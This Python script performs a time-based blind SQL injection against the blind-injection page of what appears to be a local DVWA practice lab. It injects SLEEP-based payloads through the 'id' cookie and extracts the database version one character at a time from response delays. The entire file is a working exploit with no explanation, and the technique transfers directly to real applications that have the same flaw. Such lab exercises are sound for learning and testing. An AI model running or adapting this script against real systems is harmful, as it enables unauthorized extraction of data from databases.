import requests
import time

URL = "http://localhost:8000/vulnerabilities/sqli_blind/"

BASE_COOKIES = {
    "PHPSESSID": "eqpdijdfcckjif62i98u15ce15",
    "security": "high",
    "language": "en"
}


def is_true(payload):
    cookies = BASE_COOKIES.copy()
    cookies["id"] = payload

    start = time.time()
    requests.get(URL, cookies=cookies)
    end = time.time()

    return (end - start) > 4.5


def get_version_length(max_len=50):
    print("Finding Sql version length...")
    for length in range(1, max_len + 1):
        payload = f"1' AND IF(LENGTH(@@version)={length},SLEEP(5),0)#"
        if is_true(payload):
            print(f"Sql version length: {length}")
            return length
    return None


def get_sql_version(length):
    print("Extract Sql version...")
    version = ""

    for position in range(1, length + 1):
        for ascii_code in range(32, 127):  # full printable ASCII
            payload = (
                f"1' AND IF(ASCII(SUBSTRING(@@version,{position},1))="
                f"{ascii_code},SLEEP(5),0)#"
            )
            if is_true(payload):
                version += chr(ascii_code)
                print(f"Char {position}: {chr(ascii_code)}")
                break

    return version


if __name__ == "__main__":
    length = get_version_length()
    if length:
        version = get_sql_version(length)
        print(f"\nSql version : {version}")
